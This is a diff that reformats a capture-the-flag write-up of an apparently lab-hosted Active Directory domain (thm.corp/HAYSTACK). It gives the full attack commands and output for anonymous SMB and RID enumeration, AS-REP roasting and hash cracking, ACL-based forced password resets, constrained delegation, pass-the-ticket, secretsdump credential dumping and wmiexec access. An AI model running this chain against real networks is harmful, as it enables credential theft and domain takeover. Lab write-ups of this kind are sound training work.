@@ -1,6 +1,14 @@
-started  with a nmap scan of the victim
+### Note:- The IP of victim maybe different in some commands and output as lab was restarted, rest nothing affected
 
+
+# AD Enumeration and Attack Path
+
+Started with an Nmap scan of the victim.
+
+```bash
 nmap -sS -sV -O 10.49.137.0/24
+```
+```text
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-09-28 12:42 UTC
 Nmap scan report for ip-10-49-137-6.ap-south-1.compute.internal (10.49.137.6)
 Host is up (0.00049s latency).
@@ -47,7 +55,10 @@ OS:Y%DFI=N%T=40%CD=S)
 
 Network Distance: 1 hop
 Service Info: Host: irc.pentest-target.thm; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
 
+## 2. DNS Enumeration
+```
 domain name: thm.corp0
 Host: HAYSTACK
 Target_Name: THM
@@ -56,17 +67,23 @@ Target_Name: THM
 |   DNS_Domain_Name: thm.corp
 |   DNS_Computer_Name: HayStack.thm.corp
 |   DNS_Tree_Name: thm.corp
+```
 
+Performed DNS enumeration and found the DC name, which we already had.
 
-Did dns eumeration, found the DC name which we already had
-
+```bash
 dig @10.49.156.141 thm.corp
+```
 Domain: thm.corp
 DC: HayStack.thm.corp
 
+## 3. SMB Enumeration
+
 Then performed SMB enumeration
 
+```bash
 smbclient -L //10.49.137.6 -N
+```
 
 	Sharename       Type      Comment
 	---------       ----      -------
@@ -78,19 +95,20 @@ smbclient -L //10.49.137.6 -N
 	SYSVOL          Disk      Logon server share 
 SMB1 disabled -- no workgroup available
 
-there was anonymous access to smb Data shares
+There was anonymous access to the SMB `Data` share.
 
-found a directory named Onboarding and there were three files and their names were changing continuosly 
+Found a directory named `Onboarding` containing three files whose names were changing continuously. 
 
 
+```bash
 smbclient //10.49.137.6/Data -N
-Try "help" to get a list of possible commands.
+```
+```
 smb: \> ls 
   .                                   D        0  Wed Jul 19 08:40:57 2023
   ..                                  D        0  Wed Jul 19 08:40:57 2023
   onboarding                          D        0  Mon Sep 28 13:59:34 2026
 
-		7863807 blocks of size 4096. 3025130 blocks available
 smb: \> cd onboarding\
 smb: \onboarding\> ls
   .                                   D        0  Mon Sep 28 13:59:34 2026
@@ -98,80 +116,110 @@ smb: \onboarding\> ls
   dakcxrop.3ln.pdf                    A  3032659  Mon Jul 17 08:12:09 2023
   e1btu2mf.wjp.txt                    A      521  Mon Aug 21 18:21:59 2023
   ufliurwy.xmg.pdf                    A  4700896  Mon Jul 17 08:11:53 2023
+```
+Enumerated the files but did not find anything useful except an employee name and a sample reset password.
+Employee: LILY ONEILL  
+Initial password: ResetMe123!  
+Also extracted metadata using `exiftool`, but nothing useful was found.
 
-Enumerated files but did not find something useful except some employee name and a sample reset password
-Employee: LILY ONEILL
-Initial password: ResetMe123!
-Also exctracted metadata using exiftool but nothing useful
+## 4. User Enumeration
 
-After that tried RID bruteforcing for user enumeration using netexec and got list of usernames
+After that, tried RID bruteforcing for user enumeration using NetExec and obtained a list of usernames.
 
+```bash
 nxc smb 10.49.156.141 -u guest -p '' --rid-brute > users1.txt
+```
 
-After getting the list of usernames, formatted the list such that only usernames are present
+After getting the list of usernames, formatted the list so that only usernames were present.
+
+## 5. AS-REP Roasting
 
 Then enumerated users for AS-REP Roasting
 
+```bash
 impacket-GetNPUsers thm.corp/ -usersfile usersv2.txt -dc-ip 10.49.156.141
+```
 
-Found 3 AS-REP roastable accounts (got their asrep hashes)
-ERNESTO_SILVA
-TABATHA_BRITT
-LEANN_LONG
+Found 3 AS-REP roastable accounts and obtained their AS-REP hashes.  
+ERNESTO_SILVA  
+TABATHA_BRITT  
+LEANN_LONG  
 
-Put all the hashes in a file and tried cracking using hashcat
+Put all the hashes into a file and tried cracking them using Hashcat.
 
+```bash
 hashcat -m 18200 hashes.txt /usr/share/wordlist/rockyou.txt
+```
 
-Only cracked hash for one account
+Only cracked the hash for one account.
 
 TABATHA_BRITT : marlboro(1985)
 
-verified creds against smb
+## 6. Credential Verification
 
+Verified the credentials against SMB.
+
+```bash
 crackmapexec smb 10.49.156.141 -u TABATHA_BRITT -p 'marlboro(1985)' --users
+```
+```bash
 crackmapexec smb 10.49.156.141 -u TABATHA_BRITT -p 'marlboro(1985)' --shares
+```
 
-Then ran bloodhound to get info about the ad related to acls, groups, users etc.
+## 7. BloodHound Enumeration
 
+Then ran BloodHound to get information about the AD, including ACLs, groups, users, etc.
+
+```bash
 bloodhound-python -u 'TABATHA_BRITT' -p 'marlboro(1985)' -d 'thm.corp' -dc 'HayStack.thm.corp' -ns 10.49.156.141 -c All
+```
 
-Uploaded json to bloodhound and found this attack path (screenshots attached)
+Uploaded the JSON files to BloodHound and found the following attack path (screenshots attached).
 
-TABATHA_BRITT
-    └── GenericAll → SHAWNA_BRAY
-SHAWNA_BRAY
-    └── ForceChangePassword → CRUZ_HALL
-CRUZ_HALL
-    ├── ForceChangePassword → DARLA_WINTERS
-    ├── GenericWrite → DARLA_WINTERS
-    └── Owns → DARLA_WINTERS
-DARLA_WINTERS
-    └── AllowedToDelegate → HAYSTACK.THM.CORP
+TABATHA_BRITT  
+    └── GenericAll → SHAWNA_BRAY  
+SHAWNA_BRAY  
+    └── ForceChangePassword → CRUZ_HALL  
+CRUZ_HALL  
+    ├── ForceChangePassword → DARLA_WINTERS  
+    ├── GenericWrite → DARLA_WINTERS  
+    └── Owns → DARLA_WINTERS  
+DARLA_WINTERS  
+    └── AllowedToDelegate → HAYSTACK.THM.CORP  
 
 
-then we forcechanged every user's password using the rights and finally reached to darla winters
+## 8. Privilege Escalation Through ACLs
 
+Then we force-changed each user's password using the available rights and finally reached Darla Winters.
+
+```bash
 samba-tool user setpassword SHAWNA_BRAY --newpassword='Password@123' -U "thm.corp\TABATHA_BRITT" -H ldap://10.49.156.141
+```
+```bash
 samba-tool user setpassword CRUZ_HALL --newpassword='Password@123' -U "thm.corp\SHAWNA_BRAY" -H ldap://10.49.156.141
+```
+```bash
 samba-tool user setpassword DARLA_WINTERS --newpassword='Password@123' -U "thm.corp\CRUZ_HALL" -H ldap://10.49.156.141
+```
 
 
-from darla's delegation configuration we confirmed that
+## 9. Constrained Delegation
+
+From Darla's delegation configuration, we confirmed that:  
 trustedtoauth: True
 
-msDS-AllowedToDelegateTo:
-cifs/HayStack.thm.corp/thm.corp
-cifs/HayStack.thm.corp
-cifs/HAYSTACK
-cifs/HayStack.thm.corp/THM
-cifs/HAYSTACK/THM
+msDS-AllowedToDelegateTo:  
+cifs/HayStack.thm.corp/thm.corp  
+cifs/HayStack.thm.corp  
+cifs/HAYSTACK  
+cifs/HayStack.thm.corp/THM  
+cifs/HAYSTACK/THM  
 
 servicePrincipalName:
 POP3/HAYSTACK
 
 Then performed constrained delegation 
-
+```
 Darla credentials
        │
        ▼
@@ -185,21 +233,27 @@ Administrator identity
        │
        ▼
 cifs/HayStack.thm.corp
-
+```
+```bash
 getST.py -spn 'cifs/HayStack.thm.corp' -impersonate 'Administrator' -dc-ip 10.49.156.141 'thm.corp/DARLA_WINTERS:Password@123'
-The ticket was saved in .ccache (Kerberos credential cache)
+```
+The ticket was saved in `.ccache` (Kerberos credential cache).
 
 (screenshot attached for output)
 
-then we pointed KRB5CCNAME to our .ccache 
+## 10. Pass-the-Ticket
+
+Then we pointed `KRB5CCNAME` to our `.ccache`.   
 KRB5CCNAME -> environment variable used by Kerberos to locate the active credentials cache containing ticket-granting tickets (TGTs) and session keys
 
-now since we had ticket we can now do pass-the-ticket for wmi access without using password
+Now, since we had the ticket, we could perform pass-the-ticket to dump hashed and for WMI access without using a password.
 
-extracted credentials/hashes for users using pass-the-ticket
+Extracted credentials/hashes using pass-the-ticket.
+```bash
 secretsdump.py thm.corp/Administrator@haystack.thm.corp -k -no-pass
+```
 
-
+```
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:ab4f5a5c42df5a0ee337d12ce77332f5:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
@@ -213,9 +267,57 @@ THM\HAYSTACK$:plain_password_hex:7b5be2a05fef69a9e1b6c2c8f1d12d77f8f2e6590b61e40
 THM\HAYSTACK$:aad3b435b51404eeaad3b435b51404ee:eeae607c3480929b28d8607263233dc3:::
 [*] DefaultPassword 
 THM\automate:Passw0rd!
+```
+We also tried pass-the-hash, but it failed. I believe this was because the hash was for `HAYSTACK\Administrator`, as it was extracted from the local SAM, which is different from `THM\Administrator`.
 
-we also tried pass-the-hash but failed as I believe it was because the hash was of HAYSTACK\Administrator as it was extarcted from local SAM which is different from THM\Administrator
 
+## 11. WMI Access
 
+Finally, using pass-the-ticket, got WMI access and obtained both the root and user flags.
+
+```bash
 wmiexec.py -k -no-pass 'thm.corp/Administrator@haystack.thm.corp'
--k -> point to the ticket in .ccache 
+```
+-k -> points to the ticket in `.ccache`. 
+
+## 12. Final Attack Chain
+```
+Final attack-chain
+Anonymous SMB
+      │
+      ▼
+Data Share (Dead end)
+      │
+      ├── Initial Password (useless)
+      └── Employee Information (somewhat useful)
+              │
+              ▼
+       User Enumeration
+              │
+              ▼
+       AS-REP Roasting
+              │
+              ▼
+      TABATHA_BRITT
+              │
+              │ GenericAll
+              ▼
+        SHAWNA_BRAY
+              │
+              │ ForceChangePassword
+              ▼
+          CRUZ_HALL
+              │
+              │ GenericWrite / Owns /
+              │ ForceChangePassword
+              ▼
+        DARLA_WINTERS
+              │
+              │ Constrained Delegation
+              │ cifs/HAYSTACK
+              ▼
+          HAYSTACK
+              │
+              ▼
+     Administrator context
+```
